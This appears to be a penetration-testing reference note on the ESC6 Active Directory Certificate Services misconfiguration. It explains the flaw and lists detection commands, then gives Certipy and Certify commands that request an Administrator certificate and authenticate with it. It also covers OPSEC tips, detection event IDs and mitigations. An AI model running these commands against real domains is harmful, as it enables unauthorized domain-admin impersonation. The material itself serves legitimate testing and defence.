---
title: "Attack #31 — ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 Flag"
description: "ESC6 is a CA-wide misconfiguration where the EDITF_ATTRIBUTESUBJECTALTNAME2 flag is enabled on the Certificate Authority. When this flag is set, it allows…"
category: active-directory
tags: ["active-directory", "adcs"]
tools: ["Certipy", "Certify", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Four/🟢 Attack #31 — ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 Flag.md"
---
# 🟢 Attack #31 — ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

***

## 📖 How It Works

ESC6 is a **CA-wide misconfiguration** where the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is enabled on the Certificate Authority. When this flag is set, it allows certificate requesters to specify an arbitrary **Subject Alternative Name (SAN)** in their certificate request — regardless of the template's configuration. This means even templates that normally don't allow SAN specification become vulnerable — the attacker can request a certificate for any user in the domain.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA** | CA-level configuration flag |
| **Enrollment rights on any Client Auth template** | Any template with Client Authentication EKU |

***

## 💻 Full Commands

### 🔵 Check If Flag Is Enabled

```powershell
# ── certutil (on the CA or targeting it remotely) ─────────────────────────────
certutil -config "CORP-CA" -getreg policy\EditFlags
# Look for: EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
```

```bash
# ── Certipy ───────────────────────────────────────────────────────────────────
certipy find -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout
# Look for: ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 is set
```

### 🔴 Exploit ESC6

```bash
# ── Request cert with arbitrary SAN using ANY template ────────────────────────
certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -template User -upn Administrator@corp.local -dc-ip 10.10.10.10

# ── Authenticate as Administrator ─────────────────────────────────────────────
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

```powershell
# ── Certify ───────────────────────────────────────────────────────────────────
.\Certify.exe request /ca:CORP-CA /template:User /altname:Administrator
```

***

## 🎯 OPSEC Tips

- **ESC6 affects ALL templates** — even properly configured ones become vulnerable
- **Microsoft patched this** in May 2022 (KB5014754) — patched CAs ignore SAN in request if template doesn't allow it
- **Check patch level** — unpatched CAs are still vulnerable

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4886** | Security Log (CA) | Certificate enrollment with SAN different from requester |
| **4887** | Security Log (CA) | Certificate issued with arbitrary SAN |

***

## 🔗 Attack Chain Context

```
[ESC6] ──→ CA flag allows SAN on ANY template → impersonate any user
         │
         ├──→ 🔗 Makes every template ESC1-equivalent
         ├──→ 📋 Patched in KB5014754 (May 2022)
         └──→ 💀 Defeated by: disable EDITF flag, patch CA, audit enrollments
```

***

> ✅ **Attack #31 — ESC6 complete.**
